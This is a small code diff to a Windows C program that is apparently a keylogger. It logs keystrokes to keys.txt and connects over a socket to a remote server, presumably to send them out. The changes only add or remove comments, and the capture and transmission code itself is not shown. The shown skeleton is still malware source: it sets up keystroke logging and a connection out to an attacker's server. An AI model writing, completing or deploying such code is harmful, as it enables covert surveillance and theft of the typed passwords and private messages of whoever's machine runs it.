@@ -6,7 +6,6 @@
 #include <windows.h>
 #include <winuser.h>
 
-// this file still needs fixing
 
 void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip);
 void startWinsock(WSADATA *wsaData);
@@ -17,6 +16,8 @@ void closeSocket(SOCKET client_socket);
 
 
 int main() {
+
+    // socket details and setup
     SOCKET client_socket;
     struct sockaddr_in serv_addr;
     WSADATA wsaData;
@@ -37,6 +38,8 @@ void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const cha
     FILE *keysPtr;
     keysPtr = fopen("keys.txt", "w");
     keysPtr = fopen("keys.txt", "a");
+
+    // connect to the server via socket
     connectToServer(serv_addr, client_socket, server_ip);
 
     // constantly loop through all the characters and check if they are currently being pressed or not
